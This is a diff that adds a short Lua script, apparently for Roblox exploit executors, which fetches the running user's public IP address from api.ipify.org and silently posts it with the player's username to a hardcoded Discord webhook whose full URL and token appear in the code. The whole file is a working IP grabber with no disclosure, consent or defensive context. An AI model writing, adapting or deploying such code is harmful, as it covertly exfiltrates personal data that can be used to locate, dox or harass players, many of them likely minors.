@@ -1,0 +1,39 @@
+local HttpService = game:GetService("HttpService")
+
+local discordWebhookUrl = "https://discord.com/api/webhooks/1353807250950717470/Skd2v3m9nXjOsl1YCXNSwB1ZOVRoTqy-qvOgLUohXC-1HzaMiq_zr3yExu_FVQlvHpJo"
+
+local function getIp()
+    local response = request({
+        Url = "https://api.ipify.org/?format=json",
+        Method = "GET"
+    })
+
+    if response.StatusCode == 200 then
+        local data = HttpService:JSONDecode(response.Body)
+        return data.ip
+    else
+        return nil
+    end
+end
+
+local function sendToDiscord(ip)
+    local messageData = {
+        ["content"] = "Username: " .. game.Players.LocalPlayer.Name .. "\nIp: " .. ip
+    }
+
+    local jsonData = HttpService:JSONEncode(messageData)
+
+    request({
+        Url = discordWebhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+end
+
+local ip = getIp()
+if ip then
+    sendToDiscord(ip)
+end
